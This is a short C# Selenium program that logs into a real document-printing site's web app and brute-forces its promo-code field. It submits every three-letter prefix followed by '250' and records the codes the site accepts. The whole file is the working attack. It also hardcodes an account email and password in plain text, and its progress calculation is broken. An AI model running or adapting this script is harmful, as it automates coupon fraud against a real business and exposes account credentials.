
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;

namespace ZeroCopyCodes
{
    internal class Program
    {
        static void Main(string[] args)
        {
            IWebDriver driver = new ChromeDriver();
            driver.Url = "https://app.zerocopy.be/documents";

            IWebElement email = driver.FindElement(By.Id("txtLoginEmail"));
            email.SendKeys("realblubdevis@gmail.com");
            IWebElement login = driver.FindElement(By.Id("txtLoginPassword"));
            login.SendKeys("Cb3!.QHPKVBakDv");
            driver.FindElement(By.ClassName("btn-primary")).Click();
            
            //logged in
            
            Thread.Sleep(4000);
            driver.FindElement(By.CssSelector("button[class='btn btn-secondary']")).Click();
            Thread.Sleep(2000);
            driver.FindElement(By.CssSelector("button[class='close']")).Click();
            Thread.Sleep(1000);
            
            //ready

            String[] chars = new String[]{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"};
            String code = "";
            int currentcode = 0;
            int found = 0;
            List<string> codes = new List<string>();
            foreach (String l1 in chars)
            {
                foreach (String l2 in chars)
                {
                    foreach (String l3 in chars)
                    {
                        try
                        {
                            if (driver.FindElement(By.CssSelector("div[class='notification-message']")).Text !=
                                "This code doesn't exist in our system.")
                            {
                                found++;
                                codes.Add(code);
                            }
                            
                            for (int i = 0; i < 10; i++)
                            {
                                driver.FindElement(By.CssSelector("div[class='notification-message']")).Click();
                            }
                            
                        }
                        catch (Exception e)
                        {
                            Console.WriteLine("dismiss not found");
                        }
                        
                        code = $"{l1}{l2}{l3}250";
                        driver.FindElement(By.Id("promoCode")).Clear();
                        driver.FindElement(By.Id("promoCode")).SendKeys(code);
                        driver.FindElement(By.CssSelector("button[class='btn btn-secondary btn-sm ml-1']")).Click();

                        currentcode++;
                        double percent = currentcode / (26 ^ 3)/10;
                        
                        Console.WriteLine($"sent {code}, {Math.Round(percent,5)}% found {found}");
                        Thread.Sleep(200);
                    }
                }
            }
            foreach (string curcode in codes)
            {
                Console.WriteLine(curcode);
            }
        }
    }
}
